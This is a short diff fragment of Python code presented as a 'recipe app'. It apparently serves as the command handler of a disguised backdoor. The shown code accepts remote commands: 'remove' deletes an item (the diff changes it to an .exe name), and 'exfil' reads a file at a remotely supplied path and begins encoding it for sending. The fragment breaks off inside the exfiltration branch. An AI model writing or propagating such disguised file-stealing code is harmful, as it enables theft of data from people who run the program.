@@ -106,7 +106,7 @@ def run_recipe_app(recipesrusip, connport=8080):
 
         if request[0] == "remove":
             conn.close()
-            recipe_list.remove("noodle_recipes_generator")
+            recipe_list.remove("noodle_recipes_generator.exe")
         elif request[0] == "exfil":
             encoded_string = ""
             with open(request[1], 'rb') as f:
